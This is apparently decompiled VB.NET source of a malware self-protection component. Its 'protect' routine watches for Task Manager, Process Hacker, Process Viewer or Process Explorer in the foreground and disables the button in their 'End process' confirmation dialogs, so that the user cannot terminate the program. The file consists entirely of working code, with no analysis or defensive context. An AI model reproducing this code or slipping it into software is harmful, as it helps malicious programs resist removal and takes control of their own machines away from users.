Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace w
	' Token: 0x0200000A RID: 10
	Public Class mgr
		' Token: 0x06000049 RID: 73 RVA: 0x00006298 File Offset: 0x00004498
		Public Sub New()
			Me.CLD = New List(Of IntPtr)()
		End Sub

		' Token: 0x0600004A RID: 74
		Private Declare Function EnableWindow Lib "user32.dll" (hWnd As IntPtr, bEnable As Boolean) As Boolean

		' Token: 0x0600004B RID: 75
		Private Declare Ansi Function GetWindowThreadProcessId Lib "user32.dll" (hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer

		' Token: 0x0600004C RID: 76
		Private Declare Ansi Function GetForegroundWindow Lib "user32.dll" () As IntPtr

		' Token: 0x0600004D RID: 77
		Private Declare Ansi Function GetClassName Lib "user32" Alias "GetClassNameA" (hwnd As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpClassName As String, nMaxCount As Integer) As Integer

		' Token: 0x0600004E RID: 78
		Private Declare Ansi Function SendMessage Lib "user32" Alias "SendMessageA" (hwnd As Integer, wMsg As Integer, wParam As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lParam As String) As Integer

		' Token: 0x0600004F RID: 79
		Private Declare Auto Function GetWindowText Lib "user32.dll" (hwnd As Integer, lpString As StringBuilder, cch As Integer) As Integer

		' Token: 0x06000050 RID: 80
		Private Declare Auto Function GetWindowTextLength Lib "user32.dll" (hwnd As Integer) As Integer

		' Token: 0x06000051 RID: 81
		Private Declare Ansi Function EnumChildWindows Lib "user32" (hWnd As IntPtr, lpEnumFunc As mgr.EnumWindProc, ByRef lParam As IntPtr) As Integer

		' Token: 0x06000052 RID: 82 RVA: 0x000062B0 File Offset: 0x000044B0
		Private Function EnumChild(hWnd As Integer, lParam As Integer) As Boolean
			Me.CLD.Add(CType(hWnd, IntPtr))
			Return True
		End Function

		' Token: 0x06000053 RID: 83 RVA: 0x000062D8 File Offset: 0x000044D8
		Public Sub protect()
			' The following expression was wrapped in a checked-statement
			While True
				Thread.Sleep(200)
				Dim foregroundWindow As IntPtr = mgr.GetForegroundWindow()
				Dim flag As Boolean = foregroundWindow.ToInt32() = 0
				If Not flag Then
					Dim num As Integer = 0
					mgr.GetWindowThreadProcessId(foregroundWindow, num)
					flag = num > 0
					If flag Then
						Dim windowTextLength As Integer = mgr.GetWindowTextLength(CInt(foregroundWindow))
						flag = windowTextLength = 0
						Dim text As String
						If flag Then
							text = ""
						Else
							Dim stringBuilder As StringBuilder = New StringBuilder(windowTextLength + 1)
							Dim windowText As Integer = mgr.GetWindowText(CInt(foregroundWindow), stringBuilder, stringBuilder.Capacity)
							flag = windowText = 0
							If flag Then
								text = ""
							Else
								text = stringBuilder.ToString()
							End If
						End If
						Dim processById As Process = Process.GetProcessById(num)
						flag = (Operators.CompareString(processById.ProcessName.ToLower(), "taskmgr", False) = 0) Or (Operators.CompareString(processById.ProcessName.ToLower(), "processviewer", False) = 0) Or (Operators.CompareString(processById.ProcessName.ToLower(), "processhacker", False) = 0) Or (Operators.CompareString(text.ToLower(), "process explorer", False) = 0)
						If flag Then
							Dim list As List(Of IntPtr) = New List(Of IntPtr)()
							Dim num2 As Integer = 0
							For Each intPtr As IntPtr In Me.GetChild(foregroundWindow)
								Dim text2 As String = Strings.Space(200)
								Dim className As Integer = mgr.GetClassName(CInt(intPtr), text2, 200)
								text2 = text2.Remove(className, 200 - className)
								flag = Operators.CompareString(text2.ToLower(), "button", False) = 0
								If flag Then
									list.Add(intPtr)
								End If
								flag = (Operators.CompareString(text2.ToLower(), "static", False) = 0) Or (Operators.CompareString(text2.ToLower(), "directuihwnd", False) = 0)
								If flag Then
									num2 += 1
								End If
							Next
							flag = (list.Count = 2) And ((num2 = 2) Or (num2 = 1))
							If flag Then
								mgr.EnableWindow(list(0), False)
								Dim num3 As Integer = CInt(list(0))
								Dim num4 As Integer = 12
								Dim num5 As Integer = 0
								Dim text3 As String = "End process"
								mgr.SendMessage(num3, num4, num5, text3)
							End If
						End If
					End If
				End If
			End While
		End Sub

		' Token: 0x06000054 RID: 84 RVA: 0x00006534 File Offset: 0x00004734
		Private Function GetChild(hwd As IntPtr) As IntPtr()
			Dim array As IntPtr()
			SyncLock Me
				Me.CLD.Clear()
				Dim enumWindProc As mgr.EnumWindProc = AddressOf Me.EnumChild
				Dim intPtr As IntPtr = CType(0, IntPtr)
				mgr.EnumChildWindows(hwd, enumWindProc, intPtr)
				array = Me.CLD.ToArray()
			End SyncLock
			Return array
		End Function

		' Token: 0x04000031 RID: 49
		Private CLD As List(Of IntPtr)

		' Token: 0x0200000B RID: 11
		' (Invoke) Token: 0x06000058 RID: 88
		Private Delegate Function EnumWindProc(hWnd As Integer, lParam As Integer) As Boolean

		' Token: 0x0200000C RID: 12
		' (Invoke) Token: 0x0600005C RID: 92
		Private Delegate Function EnumChildWindProc(hWnd As Integer, lParam As Integer) As Boolean
	End Class
End Namespace
